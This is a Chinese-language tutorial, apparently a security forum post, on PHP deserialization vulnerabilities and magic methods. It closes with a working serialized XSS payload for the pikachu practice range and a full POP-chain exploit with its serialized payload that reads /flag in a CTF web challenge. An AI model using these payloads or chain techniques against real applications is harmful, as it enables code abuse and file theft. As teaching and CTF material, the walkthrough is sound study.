PHP反序列化漏洞这么学（细）！
================

简介
--

要想学习反序列化就要知道序列化的原理和作用，序列化就是把对象的成员变量转换为可以保存的和传输的字符串的过程，而反序列化就是把字符串再转换为原来的对象的变量，而这两个过程就很好的做到存储和传输数据。而序列化和反序列化分别通过函数serialize()和unserialize()来实现。

正文
--

介绍一下反序列化漏洞究竟是怎么产生的，其实在反序列化对象的时候，就会触发一些PHP的魔术方法，我知道大家都想知道这些魔术方法是怎么来的为什么会调用，这些魔术方法其实在设计类的时候写在类里面的，魔术方法函数有很多，要写那些就要看具体要实现那些功能了，PHP中的魔术方法通常以\_\_(两个下划线)开始，并且不需要显示的调用而是由某种特定的条件触发。  
例子：

```php
<?php
  class Person
  {                                   
      public $name;                                                                     
    public function __construct($name="")
    {   
      $this->name = $name;
    }
      function __destruct(){
       echo "完毕";
    }
    /**
     * hello方法
     */
    public function hello()
    { 
      echo "你好：" . $this->name;
    }  

  }
?>
```

这就是一个典型的构造函数和析构函数，学过面向对象的都知道，举这个例子是比较好理解，这也就是魔术方法的用法。所以在反序列化的时候就是会调用这一些魔术方法，如果在魔术方法里面写了一些具有特定功能的函数，比如写入，读取，查询等。那么漏洞就产生了，但是没有写功能的话（如：仅仅只是做输出操作且输出的内容是定好的了，且输出信息没价值）那么漏洞也就不会产生，所以有反序列化不一定有漏洞，如果有反序列化漏洞那么在实战过程中肯定会有很多过滤的这时候就要代码审计绕过了。  
下面我就介绍一些实战中的一些魔术方法。

- \_\_construct()，类的构造函数
- \_\_destruct()，类的析构函数
- \_\_call()，在对象中调用一个不可访问方法时调用
- \_\_get()，访问一个不存在的成员变量或访问一个private和protected成员变量时调用
- \_\_set()，设置一个类的成员变量时调用
- \_\_isset()，当对不可访问属性调用isset()或empty()时调用
- \_\_unset()，当对不可访问属性调用unset()时被调用。
- \_\_sleep()，执行serialize()时，先会调用这个函数
- \_\_wakeup()，执行unserialize()时，先会调用这个函数
    
    构造和析构相信大家都很了解就不说了。
    
    ### \_\_call()
    
    当调用一个成员函数时如果它存在就运行它，如果它不存在这就会调用\_\_call()函数。
    
    ```php
    <?php
    class Person
    {               
    function say()
    { 
    
      echo "你好！\n"; 
    }   
    
    /**
    * 当方法不存在时调用__call()函数
    */
    function __call($F, $A)
    { 
     echo "你所调用的函数：" . $F . "(参数：" ;
     print_r($A); 
     echo "不存在!\n";         
    }                     
    }
    $Person = new Person();     
    $Person->say(); 
    $Person->run("不存在!"); // 调用不存在的方法，则自动调用了对象中的__call()方法    
    ?>
    ```
    
    结果：  
    [![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2b566bf0f4fb8232e6aabbeacf66b901365909a5.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2b566bf0f4fb8232e6aabbeacf66b901365909a5.png)  
    在这里我们可以看到创建了一个对象这个对象它调用了say函数和run函数，say函数作为成员函数里面有但是run函数就没有了这时候就会调用\_\_call()这个魔术方法。
    
    ### \_\_get()
    
    当访问一个不存在的成员变量或访问一个private和protected成员变量时调用  
    1、当访问一个不存在成员变量时调用
    
    &lt;?php  
    class Test {  
    public $n='Hello, word!';  
    // **get()：访问不存在的成员变量时调用  
    public function** get($name){  
    echo '调用此\_\_get(),因为不存在'.$name;  
    }  
    }
    
    $a = new Test();  
    // 存在成员变量n，所以直接访问  
    echo $a-&gt;n;  
    echo "\\n";  
    // 不存在成员变量A，所以调用**get  
    echo $a-&gt;A;  
    ?&gt;  
    结果：  
    [![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3eab59aecb5c96eef0b5f54c27d4247a80d14756.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3eab59aecb5c96eef0b5f54c27d4247a80d14756.png)  
    在这里实例化的对象它访问了这个成员变量n，他存在在类中所以不调用**get()函数，当它调用A时就会调用，因为根本就没有成员变量A。  
    2、当访问一个private和protected成员变量时调用
    
    ```php
    <?php
    class Person
    {
    private $name;
    function __construct($name="")
    {
    $this->name = $name;
    
    }
    public function __get($Name)
    {  
    
      return $this->$Name;
    }
    }
    $NAME = new Person("张三");  // 通过Person类实例化的对象，并通过构造方法为属性赋初值
    echo "名字：" . $NAME->name;  // 直接访问私有属性name，因为私有属性不可直接访问所以自动调用了__get()方法可以间接获取
    ?>
    ```
    
    对象它访问了一个私有的属性，正常情况下是不能直接访问的，这样就触发了这个\_\_get()魔术方法。
    
    ### \_\_set()
    
    这个的实质是给成员变量赋值是会调用它（其中包括给公有、私有、保护成员变量或者根本不存在的成员函数赋值，实质是这个赋值操作！），在参数初始化的时候是不会调用\_\_set（）函数的。
    
    ```php
    
    <?php
    ```

class Test{  
public function shell(){  
echo $this-&gt;A;  
}  
protected $A=1;  
public function **set($name,$value){  
echo "正在赋值！（正在调用**set()函数！）\\n";  
$this-&gt;A=$value;

```php
}
```

}

$a = new Test();  
echo "初始值为：";  
$a-&gt;shell();  
echo "\\n";  
$a-&gt;A = 111;// 在这里对A这个保护成员进行赋值，所以调用了**set()函数  
$a-&gt;shell();  
echo "\\n";  
$a-&gt;AA = 11;//它对这个不存在的成员变量进行了赋值，所以调用了**set()函数  
$a-&gt;shell();  
?&gt;

```php
结果：
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-808c3f3eacb9244c4f800fd695bd1fac63be4fe3.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-808c3f3eacb9244c4f800fd695bd1fac63be4fe3.png)
在这里他分别调用了保护的成员变量和不存在的成员变量赋值了，所以自动调用了这个__set魔术方法。
### __isset()
当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。
```php
<?php
class Person
{
  public $sex;
  private $name;
  private $age;

  public function __construct($name="", $age, $sex)
  {
    $this->name = $name;
    $this->age = $age;
    $this->sex = $sex;
  }

  public function __isset($content) {
    echo "在类外部使用isset()函数测定私有成员{$content}，自动调用__isset()\n";
    echo isset($this->$content);
  }
}

$person = new Person("张三", 11,"男"); // 初始赋值
echo "----------------------------------------\n";
echo "sex为公有成员变量\n";
echo isset($person->sex),"\n";
echo "----------------------------------------\n";
echo isset($person->name),"\n";
echo "----------------------------------------\n";
echo isset($person->age),"\n";
echo "----------------------------------------\n";
?>
```

结果：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-61d298fea9f3676da2ec6f9a32e8e77c8cb71c7a.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-61d298fea9f3676da2ec6f9a32e8e77c8cb71c7a.png)  
从在这里可以看出在访问公有sex的时候他直接判断了是否被设定，而在判断name和age这两个私有成员函数的时候他就会调用\_\_isset()这个魔术方法。

### \_\_unset()

这个魔术方法触发的条件是在类外使用unset函数来删除私有和保护成员函数时会自动调用，但是在删除公有成员函数是不会调用它。

```php
<?php
class Person
{
  public $sex;
  private $name;
  private $age;

  public function __construct($name, $age,$sex)
  {
    $this->name = $name;
    $this->age = $age;
    $this->sex = $sex;
  }

  public function __unset($content) {
    echo "在类外部使用unset()函数来删除私有成员时自动调用的\n";
    echo isset($this->$content);
  }
}

$person = new Person("李四", 11,"男"); // 初始赋值
echo "----------------------------------------\n";
unset($person->sex);
echo "删除成功\n";
echo "----------------------------------------\n";
unset($person->name);
echo "\n";
echo "----------------------------------------\n";
unset($person->age);
echo "\n";
echo "----------------------------------------\n";
?>
```

结果：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9209a7009730b4d0a5955a9096f4871ecaa1f1a4.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9209a7009730b4d0a5955a9096f4871ecaa1f1a4.png)  
在这里它调用了sex，name，age三个成员变量，其中sex为public，name和age是private，所以public的没有调用\_\_unset，另外两个就会调用了。

### \_\_sleep()

要触发它的条件是序列化对象的时候就会触发，可以指定要序列化的对象属性，意思就是说他可以选择要序列化的成员变量。

```php
<?php
class He
{
  public $sex;
  public $name;
  public $age;

  public function __construct($name, $age, $sex)
  {
    $this->name = $name;
    $this->age = $age;
    $this->sex = $sex;
  }
  public function __sleep() {
    echo "调用我__sleep()方法\n";
   return array('name', 'age');
  }
}
$HH = new He("张三",11,"男"); // 初始赋值
echo serialize($HH);
echo "\n";
?>
```

结果：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ac6c0355a259db2758101d8e82ee1313f88c88e4.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ac6c0355a259db2758101d8e82ee1313f88c88e4.png)  
在这里，我们可以看到他只序列化了name和age，这个就是\_\_sleep()控制的（被return控制了），对于序列化之后的字符串对于新手师傅来说有点不好理解，我这里就给一张图片。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0ba5321decdb7d3dd8e14c7fff80ac098d1effa5.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0ba5321decdb7d3dd8e14c7fff80ac098d1effa5.png)

```php
O:2:"He":2:{s:4:"name";s:6:"张三";s:3:"age";i:11;}
```

这里O是代表序列号的为对象，2就是代表这个对象它又两个字符，第三个就是代表具体的类值了，到了第二个2就是代表他所序列化的成员变量为2个，再之后大括号里面的就是具体的序列化的变量了，其中到第一个分号为止是代表第一个序列化的成员变量，s是代表为字符串，4位变量长度，冒号里面的就是具体的值了，再到第二个分号就是代表这个变量的具体值得数据类型，个数和具体值了，后面的就依次类推。但是数据类型有很多具体序列化之后，分别用什么表示这里我推荐大家看下这篇文章：<https://blog.csdn.net/phphot/article/details/1754911>

### \_\_wakeup()

他和序列化相反是在反序列化之后就会调用。

```php
<?php
class People
{
  public $sex;
  public $name;
  public $age;

  public function __construct($name, $age, $sex)
  {
    $this->name = $name;
    $this->age = $age;
    $this->sex = $sex;
  }
  public function __wakeup() {
    echo "当在类外部使用unserialize()时会调用这里的__wakeup()方法\n";
    $this->name = '小吴';
    $this->sex = '女';
  }
}

$p = new People('小陈',10,'男'); 
$D=serialize($p);
echo $D;
echo "\n";
echo "----------------------------------------------------------------\n";
var_dump(unserialize(serialize($p)));
?>
```

结果：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3095a6725e2523fcff5358c69e73af1d9ca75586.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3095a6725e2523fcff5358c69e73af1d9ca75586.png)  
从结果可以看出他先序列化再反序列化，在反序列化的时候他调用了\_\_wakeup()函数，我们可以看到在初始化对象的时候我们给name和sex变量的值为小陈和男，反序列化之后就变成了小吴和女了，这就是触发了这个魔术方法，他里面有赋值功能所以就改变了，那大家想一想如果功能是其他的写入或者读取，数据库查询语句等，那么漏洞不就产生了。

实战演示
----

我们序列化和反序列化原理和常见的魔术方法都学了，那么就举个具体的反序列化漏洞试一试。  
举一个pikachu靶场：  
查看下源代码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7ec61a9c808d897c21f774d50877b9fd88386a21.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7ec61a9c808d897c21f774d50877b9fd88386a21.png)  
可以看到他是以post传参，它对传入的数据赋值给s在对s进行反序列化，如果不能放序列化就会把“大兄弟,来点劲爆点儿的!“写入到网页中，如果能就会用反序列化后的对象访问test成员变量，把它输出发到网页上，这里test变量值可控，就可以构造js代码构造XSS漏洞，这里仅仅只是一个输出，如何写了其他功能，如写了，读取等那么就有更大的危害了。  
那么我们就构造payload，有两种方法。  
第一种就是看些PHP代码进行序列化把结果写入到参数中

```php
<?php
class S{
    var $test = "<script>alert('xss')</script>";
}
$a = new S();
echo serialize($a);
?>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-806a9f47d69f19937fe2d2b04bdf759c8edbc7ff.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-806a9f47d69f19937fe2d2b04bdf759c8edbc7ff.png)  
第二种就是看源码直接写它的payload

```php
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

其实也都差不多吧，只要知道原理，两种都能熟练掌握。  
由于是post型，我们就直接在框框里输入或者抓个包改下参数就ok了。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c15c10ba85f8ff6c82faf9dceee8d09b80ad09ac.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c15c10ba85f8ff6c82faf9dceee8d09b80ad09ac.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1e8dea7c6ac678490f454a765f9ac710e47027ba.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1e8dea7c6ac678490f454a765f9ac710e47027ba.png)  
其实这个pikachu靶场它的反序列化漏洞，是通过反序列化之后的对象，让这个对象来访问这个test变量来实现的。  
再来看下今年第五届强网杯的web的赌徒这一题：

```php
<?php
//hint is in hint.php
error_reporting(1);

class Start
{
    public $name='guest';
    public $flag='syst3m("cat 127.0.0.1/etc/hint");';

    public function __construct(){
        echo "I think you need /etc/hint . Before this you need to see the source code";
    }

    public function _sayhello(){
        echo $this->name;
        return 'ok';
    }

    public function __wakeup(){
        echo "hi";
        $this->_sayhello();
    }
    public function __get($cc){
        echo "give you flag : ".$this->flag;
        return ;
    }
}

class Info
{
    private $phonenumber=123123;
    public $promise='I do';

    public function __construct(){
        $this->promise='I will not !!!!';
        return $this->promise;
    }

    public function __toString(){
        return $this->file['filename']->ffiillee['ffiilleennaammee'];
    }
}

class Room
{
    public $filename='/flag';
    public $sth_to_set;
    public $a='';

    public function __get($name){
        $function = $this->a;
        return $function();
    }

    public function Get_hint($file){
        $hint=base64_encode(file_get_contents($file));
        echo $hint;
        return ;
    }

    public function __invoke(){
        $content = $this->Get_hint($this->filename);
        echo $content;
    }
}

if(isset($_GET['hello'])){
    unserialize($_GET['hello']);
}else{
    $hi = new  Start();
}

?>
```

在这里我们可以看到他是以get方式传参的，在进行反序列化，这可以看到他是考我们一个典型的pop链，什么是pop链？个人看来pop链就是魔术方法触发魔术方法，触发的是另外一个类里面的魔术方法，环环相扣。回到正题，我们整理一下pop链。

```php
unserialize() -> Start::wakeup -> Start::_sayhello() -> Info::construct()->Info::toString()->Room::get() -> Room::invoke() -> Get_hint($file)
```

可以看到反序列化start类的时候他触发了wakeup的魔术方法，在里面他调用了sayhello（）函数，里面他输出了name变量，那如果这个name是个实例化的info类呢？那么就会触发info类的构造函数，在里面他输出来一个promise的字符串，如果promise是个实例化的Info类,就会触发这个\_\_toString(){**当把类作为字符串输出是触发**}，在tostring里面他有个r**eturn $this-&gt;file\['filename'\]-&gt;ffiillee\['ffiilleennaammee'\];**，我们把file\['filename'\]赋值成一个room类那么就相当于访问实例化的room类的**ffiillee\['ffiilleennaammee'\]**显然这个成员变量不存在那么就会调用get()这个魔术方法，在里面他吧变量a当成一个函数出来了，我们就可以把room类赋值进去，不就触发了invoke魔术方法了吗{**当把类作为函数是触发**}，最后我们看下invoke函数，他调用了Get\_hint($file)函数，而这个函数他直接打开/flag这个文件，并且base64加密输出了，得到flag之后解密下就Ok了。  
payload：

```php
<?php
//hint is in hint.php
error_reporting(1);

class Start
{
    public $name='guest';
    public $flag='syst3m("cat 127.0.0.1/etc/hint");';

    public function __construct(){
        echo "I think you need /etc/hint . Before this you need to see the source code";
    }

    public function _sayhello(){
        echo $this->name;
        return 'ok';
    }

    public function __wakeup(){
        echo "hi";
        $this->_sayhello();
    }
    public function __get($cc){
        echo "give you flag : ".$this->flag;
        return ;
    }
}

class Info
{
    private $phonenumber=123123;
    public $promise='I do';

    public function __construct(){
        $this->promise='I will not !!!!';
        return $this->promise;
    }

    public function __toString(){
        return $this->file['filename']->ffiillee['ffiilleennaammee'];
    }
}

class Room
{
    public $filename='/flag';
    public $sth_to_set;
    public $a='';

    public function __get($name){
        $function = $this->a;
        return $function();
    }

    public function Get_hint($file){
        $hint=base64_encode(file_get_contents($file));
        echo $hint;
        return ;
    }

    public function __invoke(){
        $content = $this->Get_hint($this->filename);
        echo $content;
    }
}
$a = new Start();
$a->name = new Info();
$a->name->file["filename"] = new Room();
$a->name->file["filename"]->a= new Room();
echo "\n";
echo serialize($a);
?>
```

结果：

```php
O:5:"Start":2:{s:4:"name";O:4:"Info":3:{s:17:"%00Info%00phonenumber";i:123123;s:7:"promise";s:15:"I will not !!!!";s:4:"file";a:1:{s:8:"filename";O:4:"Room":3:{s:8:"filename";s:5:"/flag";s:10:"sth_to_set";N;s:1:"a";O:4:"Room":3:{s:8:"filename";s:5:"/flag";s:10:"sth_to_set";N;s:1:"a";s:0:"";}}}}s:4:"flag";s:33:"syst3m("cat 127.0.0.1/etc/hint");";}
```

要注意下phonenumber他是私有的会加上%00类名%00。其实也可以手写payload的直接看源码写，只要学的精通两种方法都是很好的。

总结
--

这里我主要讲了一些魔术方法，和调用条件，漏洞产生的原理，和怎么看漏洞和写payload，我个人是怎么看有没有漏洞呢，首先我是看类里面有没有一些危险的功能，看下能不能利用，能的话就逆推一下，看看怎么才能调用它，有没有一些可利用的魔术方法再看看他和其它类有没有关联，找找有没有pop链。最后在构造payload的。

**ps**:本文章单纯是我个人的看法，如果有误，希望各位师傅指出，谢谢各位师傅，嘻嘻。